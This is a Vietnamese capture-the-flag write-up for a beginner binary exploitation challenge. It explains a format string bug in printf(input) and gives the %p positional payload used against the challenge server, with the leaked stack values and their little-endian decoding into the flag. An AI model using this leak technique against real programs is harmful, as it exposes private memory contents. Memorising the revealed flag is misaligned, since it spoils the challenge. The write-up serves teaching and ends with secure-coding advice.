# Echo Chamber — Binary Exploitation (Pwn) Write-up

## Thông tin challenge

| | |
|---|---|
| **Challenge** | Echo Chamber |
| **Category**  | Binary Exploitation (Pwn) — Beginner |
| **Author**    | hoover |

**Mục tiêu:** Khai thác lỗi trong chương trình để lấy flag.

---

## Phân tích chương trình

Chương trình yêu cầu người chơi nhập dữ liệu và sau đó in lại nội dung đã nhập. Tên challenge là *Echo Chamber* vì chương trình lặp lại thao tác nhập/xuất nhiều lần.

Sau khi phân tích binary, ta phát hiện lỗi nằm ở hàm `printf`:

```c
printf(input);
```

Thay vì:

```c
printf("%s", input);
```

Việc truyền trực tiếp input của người dùng vào `printf` tạo ra **Format String Vulnerability**.

---

## Lỗ hổng Format String

Khi người dùng kiểm soát chuỗi format, ta có thể sử dụng các format specifier như:

| Specifier | Ý nghĩa |
|---|---|
| `%p` | đọc giá trị pointer trên stack |
| `%x` | đọc giá trị dạng hex |
| `%s` | đọc chuỗi từ địa chỉ |

Do `printf` lấy dữ liệu từ stack theo format nên ta có thể leak dữ liệu nằm trong bộ nhớ.

---

## Kết nối server

Server challenge:

```bash
ncat --ssl echo-chamber-b15adc5d180a.chall.nnsc.tf 1337
```

Ta gửi payload để đọc stack:

```
%22$p %23$p %24$p %25$p ...
```

Các vị trí này chứa dữ liệu của biến flag.

---

## Khai thác

Payload sử dụng:

```
%22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p %30$p %31$p %32$p %33$p %34$p %35$p %36$p %37$p %38$p %39$p
```

Kết quả leak:

```
0x6f315f317b534e4e
0x505f576f685f6556
0x61375f46744e3172
0x5f6548745f35656b
0x35345f6b63347473
0x4e334d756772615f
0xa7d7374
```

---

## Giải mã dữ liệu

Các giá trị được lưu theo kiến trúc little endian nên cần đảo thứ tự byte.

Ví dụ:

```
0x6f315f317b534e4e
```

Sau khi đảo byte:

```
NNS{1_1o
```

Thực hiện tương tự với các block còn lại và ghép lại được flag hoàn chỉnh.

---

## Flag

```
NNS{1_1oVe_hoW_Pr1NtF_7ake5_tHe_st4ck_45_arguM3Nts}
```

---

## Kết luận

Challenge Echo Chamber giúp làm quen với Format String Vulnerability.

Kiến thức quan trọng:
- Không bao giờ truyền trực tiếp input người dùng vào `printf`.
- `printf(input)` có thể khiến attacker đọc dữ liệu trên stack.
- Các format specifier như `%p` giúp leak địa chỉ và dữ liệu.
- Dữ liệu trên x86-64 cần chú ý đến thứ tự byte little endian.

**Chuỗi khai thác:**

```
User Input
    |
    v
printf(input)
    |
    v
Format String Bug
    |
    v
Leak stack
    |
    v
Recover flag
```
